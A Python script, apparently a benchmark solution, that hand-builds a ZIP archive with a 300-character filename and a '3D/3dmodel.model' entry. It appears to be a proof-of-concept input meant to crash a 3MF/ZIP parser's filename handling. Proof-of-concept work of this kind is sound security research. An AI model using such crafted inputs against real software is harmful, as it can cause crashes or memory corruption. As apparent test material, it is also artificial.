import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def build_zip(entries):
            out = bytearray()
            central_dir = bytearray()
            offsets = []

            for filename, data in entries:
                if isinstance(filename, str):
                    filename = filename.encode('utf-8')
                if not isinstance(data, (bytes, bytearray)):
                    data = bytes(data)
                crc = zlib.crc32(data) & 0xFFFFFFFF
                local_header_offset = len(out)
                local_header = struct.pack(
                    '<IHHHHHIIIHH',
                    0x04034B50,  # Local file header signature
                    20,          # Version needed to extract
                    0,           # General purpose bit flag
                    0,           # Compression method (store)
                    0,           # Last mod file time
                    0,           # Last mod file date
                    crc,         # CRC-32
                    len(data),   # Compressed size
                    len(data),   # Uncompressed size
                    len(filename),  # File name length
                    0            # Extra field length
                )
                out += local_header
                out += filename
                out += data
                offsets.append(local_header_offset)

            for (filename, data), local_header_offset in zip(entries, offsets):
                if isinstance(filename, str):
                    filename = filename.encode('utf-8')
                crc = zlib.crc32(data) & 0xFFFFFFFF
                central_header = struct.pack(
                    '<IHHHHHHIIIHHHHHII',
                    0x02014B50,  # Central file header signature
                    20,          # Version made by
                    20,          # Version needed to extract
                    0,           # General purpose bit flag
                    0,           # Compression method
                    0,           # Last mod time
                    0,           # Last mod date
                    crc,         # CRC-32
                    len(data),   # Compressed size
                    len(data),   # Uncompressed size
                    len(filename),  # File name length
                    0,           # Extra field length
                    0,           # File comment length
                    0,           # Disk number start
                    0,           # Internal file attributes
                    0,           # External file attributes
                    local_header_offset  # Relative offset of local header
                )
                central_dir += central_header
                central_dir += filename

            central_dir_offset = len(out)
            out += central_dir
            eocd = struct.pack(
                '<IHHHHIIH',
                0x06054B50,      # End of central dir signature
                0,               # Number of this disk
                0,               # Disk with start of central directory
                len(entries),    # Total entries on this disk
                len(entries),    # Total entries
                len(central_dir),# Size of central directory
                central_dir_offset, # Offset of start of central directory
                0                # ZIP file comment length
            )
            out += eocd
            return bytes(out)

        long_name = 'A' * 300
        entries = [
            (long_name, b'X'),
            ('3D/3dmodel.model', b'<model></model>')
        ]
        return build_zip(entries)
